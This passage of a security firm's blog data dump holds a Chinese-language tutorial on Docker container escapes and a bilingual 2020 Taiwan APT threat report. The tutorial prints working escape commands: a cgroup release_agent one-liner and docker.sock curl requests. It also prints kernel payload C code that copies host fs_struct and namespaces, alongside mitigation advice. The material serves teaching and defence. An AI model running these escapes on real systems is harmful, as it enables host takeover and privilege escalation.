/etc/mtab`\n```\n\n最後一步把 `release_agent` 指到我們能控制的惡意腳本，然後利用 `echo 0 > $d/w/cgroup.procs` 把 `echo` 加入 `w` 這個 Cgroups，待 `echo` 結束後就會觸發 `notify_on_release` 然後呼叫 `release_agent`：\n\n```\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh\n$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n可以發現我們主要用到的功能是 Cgroups 以及 `mount`，因此這個利用方式有個修訂版本，只要使用 `docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash` 就可以利用較少的權限 Escape，詳細可以看[這篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。\n\n[![asciicast](https://asciinema.org/a/356357.svg)](https://asciinema.org/a/356357)\n\n#### Exposed docker.sock\n\n用 Docker 跑 Docker 的方式還有這個：\n\n```\ndocker run -v /var/run/docker.sock:/var/run/docker.sock\n```\n\n`dockerd` 開啟後預設會在 `/var/run/docker.sock` 聽取命令，等待使用者送出 Docker 指令後，`docker-cli` 會把指令轉成一定的格式跟 `docker.sock` 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。\n\n我們可以簡單的使用 `curl` 控制 `docker.sock`：\n\n```\n$ curl -XPOST --unix-socket /var/run/docker.sock -d '{\"Image\":\"ubuntu\", \"Privileged\":true}' -H 'Content-Type: application/json' http://localhost/containers/create\n{\"Id\":\"8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a\",\"Warnings\":[]}\n$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start\n```\n\n只要對 `docker.sock` 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！\n\n<br/>\n\n### Container Engine bug\n\n不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 `--privileged` 的方式運行，所以就算利用漏洞拿到 Container 的 `root` 權限，也不能用 `mount` 或 `docker.sock` 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。\n\n#### runC CVE-2019-5736\n\n第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（[詳細受影響清單](https://www.cvedetails.com/cve/CVE-2019-5736/)）。而攻擊條件是駭客在 Container 內有 `root` 權限，或 Container Engine 執行了惡意的 Container。\n\n它的漏洞原因在於，新的 Process 若是 `/proc/self/exe`，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 `root` 權限運行的，因此就獲得了 `root` 的任意命令執行！\n\n先來看 Process 在正常狀況下是如何被放進 Container。在執行 `docker exec` 的時候 runC 會把自己放進 Container 的 Namespace 然後再 `execve(\"binary\")`：\n\n![Blog_9-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png)\n\n但 Process 若指定成 `/proc/self/exe` 就會指回 runC 本身：\n\n![Blog_9-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png)\n\n有趣的事情發生了！runC 執行 `execve(\"/proc/self/exe\")`，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 `libc` 或 `libseccomp` 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！\n\n![Blog_9-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png)\n\n有任意程式碼執行後重複開啟 `/proc/self/exe`，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 `open` 的 `O_PATH` 模式留下 File descriptor，但不開啟檔案然後 `fork` 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 `docker exec` 就會觸發惡意指令！\n\n![Blog_9-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png)\n\n這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的[部落格](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)，以及他們的 [Exploit Code](https://www.openwall.com/lists/oss-security/2019/02/13/3)。\n\n[![asciicast](https://asciinema.org/a/356360.svg)](https://asciinema.org/a/356360)\n\n<br/>\n\n#### rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147\n\nrkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 `rkt enter` 開啟的 Process 才能 Escape（一般狀況下會以 `rkt run` 的方式開啟）。\n\n`rkt enter` 就像是 `docker exec`，可以在指定的 Container 內執行程式，但使用 `rkt enter` 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！\n\n所以使用 `getpcaps $$` 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！\n\n來看看利用方法，首先下載最新版的 rkt：\n\n```\nwget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz\ntar xzvf rkt-v1.30.0.tar.gz\ncd rkt-v1.30.0\n./rkt help\n```\n\n用 `getpcaps` 檢查看看：\n\n```\n$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `6': = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep\n```\n\n```\n$ sudo ./rkt enter 9354 /bin/bash\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `14': = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep\n```\n\n使用 `rkt enter` 開啟的 `bash` 有 `cap_sys_admin`，可以試著用之前說到的 `mount` 方法存取 Host 的檔案！\n\n但這裡會遇到一些問題，`mknod` 出來的 Block special file 放的位置會影響能不能 `mount`，所以這邊用一個改良的做法：\n\n```\n# mkdir mydev\n# mkdir rootfs\n# mount -t devtmpfs none mydev\n# mount mydev/sda1 rootfs\n```\n\n直接 `mount` 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 `mount mydev/sda1` 就能存取 Host 的根目錄！\n\n<br/>\n\n### Linux kernel exploit\n\n前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 `root` 權限，但並不是每個服務都是以 `root` 權限運行，例如 HTTP server 通常會以較低權限的使用者如 `www-data` 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 `root` 權限然後再 Escape！\n\n其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！\n\n讓我們看看 Linux kernel 內管理 Process 的結構 [`task_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818)\n\n```clike=\nstruct task_struct {\n\t/* ... */\n\t/*\n\t * Pointers to the (original) parent process, youngest child, younger sibling,\n\t * older sibling, respectively.  (p->father can be replaced with\n\t * p->real_parent->pid)\n\t */\n\t\n\t/* Real parent process: */\n\tstruct task_struct __rcu\t*real_parent;\n\t\n\t/* Recipient of SIGCHLD, wait4() reports: */\n\tstruct task_struct __rcu\t*parent;\n\t/* ... */\n\t/* Filesystem information: */\n\tstruct fs_struct\t\t*fs;\n\t/* ... */\n}\n```\n\n裡面有一個 [`fs_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9)，再往裡面看看：\n\n```clike=\nstruct fs_struct {\n\tint users;\n\tspinlock_t lock;\n\tseqcount_t seq;\n\tint umask;\n\tint in_exec;\n\tstruct path root, pwd;\n} __randomize_layout;\n```\n\n`task_struct->fs` 存放著這個 Process 的 `root` 以及工作目錄，而我們能夠用 `task_struct->real_parent` 取得 Parent process 的 `task_struct`，所以我們可以不斷的往上找，直到找到 `PID = 1`，也就是位於 Host 的 Init process，然後把它的 `fs_struct` 複製給自己，就可以存取 Host 的根目錄了！\n\n![Blog_9-12](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png)\n\n這個 Exploit 取自 Nick Freeman 的文章  [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：\n\n```clike=\ntypedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);\n\nuint64_t get_task(void) {\n    uint64_t task;\n    asm volatile (\"movq %%gs: 0xD380, %0\":\"=r\"(task));\n    return task;\n}\n\nvoid get_root(void) {\n\n    int i;\n    char *task;\n    char *init;\n    uint32_t pid = 0;\n\n\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n\n\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n}\n```\n\n每個 Linux kernel exploit 都會有一行：\n\n```\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n```\n\n用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 `root` 權限。而這個 Exploit 就是在它之後加上：\n\n```clike\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n```\n\n用 `while` 迴圈找到 Init process，然後呼叫 `copy_fs_struct` 把 `fs_struct` 複製回來，就能看到 Host 的根目錄。\n\n[![asciicast](https://asciinema.org/a/356361.svg)](https://asciinema.org/a/356361)\n\n但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 `kill` 是會失敗的：\n\n```\nubuntu@ubuntu:/$ ./poc\n[^] starting\n[=] running KASLR defeat exploit (CVE-2017-18344)\n[0] enumerating divide_error() location (CVE-2017-18344)\n[>] setting up proc reader\n...\n[+] done, should be root now\n[6] checking if we got root\n[+] got r00t ^_^\nroot@ubuntu:/# ps aux | grep cat\nuser     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat\nroot     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat\nroot@ubuntu:/# kill 22522\nbash: kill: (22522) - No such process\n```\n\n但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：\n\n> * Write or overwrite host or other container files (including kubelet configs)\n> * Interact with Docker (perhaps pull and launch a new fun privileged container)\n> * Inject code or harvest data from processes (host or container) via /proc/pid/mem\n> * Load/ unload kernel modules\n\n<br/>\n\n這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)：\n\n```clike=\nvoid get_root_payload( void) {\n\n        ((_commit_creds)(COMMIT_CREDS))(\n                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)\n        );\n\n        // -------- NAMESPACE DOCKER EXPLOIT  --------\n        // copy nsproxy from init_nsproxy to pid 1 of the container\n        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);\n\n        // now, do the magic.... !!!! Simple black magic doesn't work on current process!!!!\n        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);\n\n        // prepare the two namespace FDs by opening the respective files\n        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/mnt\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n\n        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/pid\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n}\n```\n\n這篇的作法是開啟 `/proc/1/ns/` 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 `mnt` 與 `pid`），然後呼叫 `setns` 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！\n\n<br/>\n\n## Mitigation\n\n上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ `root` ），就不能使用 `mount` 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 `docker run -u {uid}:{gid}`，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 `port >= 1024` 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 `mount` 做進一步的攻擊：\n\n```\n# docker run --privileged -it -u 1000 python bash\nI have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 &\n[1] 7\nI have no name!@6b6f0f0bc93d:/$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n\nI have no name!@6b6f0f0bc93d:/$ ps aux\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n1000         1  0.1  0.0   5748  3632 pts/0    Ss   02:51   0:00 bash\n1000         7  4.0  0.1  25996 18840 pts/0    S    02:51   0:00 python -m http.server 8080\n1000         8  0.0  0.0   9388  3100 pts/0    R+   02:51   0:00 ps aux\nI have no name!@6b6f0f0bc93d:/$ mkdir /tmp/t1; mkdir /tmp/t2; mount --bind /tmp/t1 /tmp/t2\nmount: only root can use \"--bind\" option\n```\n\n也可以善用 `setuid`，切換到權限較低的使用者。剩下的就是定期更新、檢查使用的產品是否出現漏洞，以及避免使用不再維護的產品。\n\n<br/>\n\n## Container security is Linux security\n\nContainer 仰賴 Linux kernel 提供的機制，隔離出一塊空間供 Container 使用，所以當這些機制出現問題或開發者設計時沒有考慮周全，原以為安全的 Container 就有可能被駭客利用，造成更大的危害。今天分別介紹 Privileged Container、Container Engine bug 以及 Linux kernel exploit 這三種攻擊情境，都是利用 Linux 本身的特性達到存取 Host 資源的效果。希望你會喜歡，也祝各位都能成功 Escape！\n\n<br/>\n\n## References\n\n* [Breaking Out of rkt – 3 New Unpatched CVEs](https://unit42.paloaltonetworks.com/breaking-out-of-coresos-rkt-3-new-cves/)\n* [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)\n* [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)\n* [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)\n* [A Compendium of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)\n* [Linux Container Escapes and Hardening](https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c)\n* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)\n\n<br/>","createdAt":"2020-09-16T01:43:32.190Z","updatedAt":"2020-11-16T06:57:08.198Z","__v":0,"id":"5f616dc46f62730051a42a50"}],"createdAt":"2020-09-16T01:37:25.458Z","updatedAt":"2020-11-16T06:57:08.242Z","__v":1,"author":"5ecb9457c96ab9003fc84906","topic":"5ecaa012a792d70040a0d8b1","id":"5f616c556f62730051a42a4a"},{"publish":true,"enable_form":false,"tags":["5ece28882e1ee4004aa406f2","5ecf890dfedd7f004b26978e","5eec1435163518003f86d92e","609b55892107530037594b0c"],"relative_posts":["5f3fdeb5163518003f86dad5","6059a16cc56e80003f985a6f","609b4c052107530037594b01","6098e8e32107530037594ad3"],"_id":"609899422107530037594a80","post_url":"apt-threat-landscape-of-taiwan-in-2020","post_name":"2020 年台灣 APT 網路攻擊態勢","publish_date":"2021-05-10T03:30:00.000Z","contents":[{"locale":"tw","_id":"609899422107530037594a81","context":"**By TeamT5 杜浦數位安全 技術長 李庭閣 Charles Li**\n\n2020 年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n<br>\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n<br>\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n<br>\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n<br>\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n<br>\n\n### 結語\n\nTeamT5 相信認識敵人是有效對抗針對性攻擊的第一步，而本文章主要針對 2020 年間所觀察到的 APT 網路攻擊態勢，提供一個概觀說明。TeamT5 威脅情資研究顯示 APT 攻擊手法持續進化，真正高端複雜的行動已經不可能由單一個資安產品做有效的防護。TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/) 是一個以網路威脅情資為核心概念的防護方案，同時我們有一群專業的專家分析師持續做研究來讓我們持續領先於攻擊者的腳步。\n\n> 如果您希望進一步了解我們的資安產品、解決方案或是想跟我們討論您所面臨的網路威脅，我們誠摯歡迎您與我們聯絡：<sales@teamt5.org>\n\n<br>\n\n### 參考資料\n\n[1] https://www.ithome.com.tw/news/139331\n\n[2] https://www.slideshare.net/codeblue_jp/cb19-resistance-is-futilethe-undefendable-supplychain-attack-by-sungting-tsai-linda-kuo\n\n[3] https://www.youtube.com/watch?v=1KXb-sf_wos\n\n[4] https://www.reuters.com/article/us-cyber-heist-north-korea-taiwan-idUSKBN1CL2VO","title":"2020 年台灣 APT 網路攻擊態勢","__v":0,"id":"609899422107530037594a81"},{"locale":"en","_id":"609899422107530037594a82","title":"APT Threat Landscape of Taiwan in 2020","__v":0,"context":"**By TeamT5 CTO Charles Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n<br>\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n<br>\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n<br>\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks 